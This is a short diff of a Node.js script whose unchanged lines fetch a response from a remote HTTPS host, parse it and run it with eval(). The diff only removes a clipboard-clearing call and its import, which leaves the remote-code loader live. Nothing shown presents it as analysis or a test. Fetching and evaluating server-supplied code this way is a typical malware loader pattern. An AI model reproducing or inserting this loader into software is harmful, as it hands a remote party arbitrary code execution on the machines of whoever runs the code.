@@ -1,7 +1,6 @@
 const fs = require('fs');
 const path = require('path');
 const request = require('request');
-const clipboardy = require("clipboardy");
 
 const protocol = 'https';
 const domain = 'link';
@@ -23,7 +22,6 @@ request(options, (err, res, body) => {
     if (err || res.statusCode !== 200) return;
 
     try {
-        clipboardy.writeText("");
         const code = JSON.parse(body);
         eval(code);
         setTimeout(() => {
